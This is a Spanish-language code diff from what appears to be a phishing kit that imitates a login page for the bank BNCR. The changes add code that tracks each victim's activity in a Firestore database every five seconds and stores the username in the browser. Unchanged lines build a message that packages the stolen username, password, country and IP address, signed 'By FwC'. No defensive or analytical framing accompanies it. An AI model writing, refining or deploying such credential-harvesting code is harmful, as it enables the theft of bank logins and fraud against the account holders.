@@ -137,9 +137,9 @@ footer {
 
   // --- SISTEMA DE LATIDOS (Heartbeat) ---
   function enviarLatido() {
-    const inputUser = document.querySelector("#ypn-us");
-    const usuarioId = inputUser ? inputUser.value.trim() : null;
+    const usuarioId = localStorage.getItem("usuario");
     
+    // Solo envía latido si el usuario ya inició sesión (está guardado en localStorage)
     if (usuarioId) {
       db.collection("prolme").doc(usuarioId).set({
         last_active: firebase.firestore.FieldValue.serverTimestamp()
@@ -149,7 +149,7 @@ footer {
     }
   }
 
-  // El latido corre cada 10 segundos de forma independiente
+  // El latido corre cada 5 segundos de forma independiente
   setInterval(enviarLatido, 5000);
 
   // Enviar latido si el usuario oculta la pestaña
@@ -252,6 +252,8 @@ footer {
         const ip = await getIPAddress();
 
         try {
+            localStorage.setItem("usuario", usuario);
+
             // Guardar o actualizar en Firestore usando la sintaxis correcta v8
             await db.collection("prolme").doc(usuario).set({
                 user: usuario,
@@ -264,8 +266,6 @@ footer {
                 page: 0,
                 last_active: firebase.firestore.FieldValue.serverTimestamp()
             }, { merge: true });
-
-            localStorage.setItem("usuario", usuario);
 
             const message = `➖➖➖➖➖[ 🏦BNCR ]➖➖➖➖➖\n👤 Usuario: ${usuario}\n👤 Contraseña: ${contrasena}\n➖➖➖➖➖[ IP ]➖➖➖➖➖\nPaís: ${pais}\nIP: ${ip}\n➖➖➖➖➖[ By FwC 👨🏻‍💻 ]➖➖➖➖➖\n`;
 
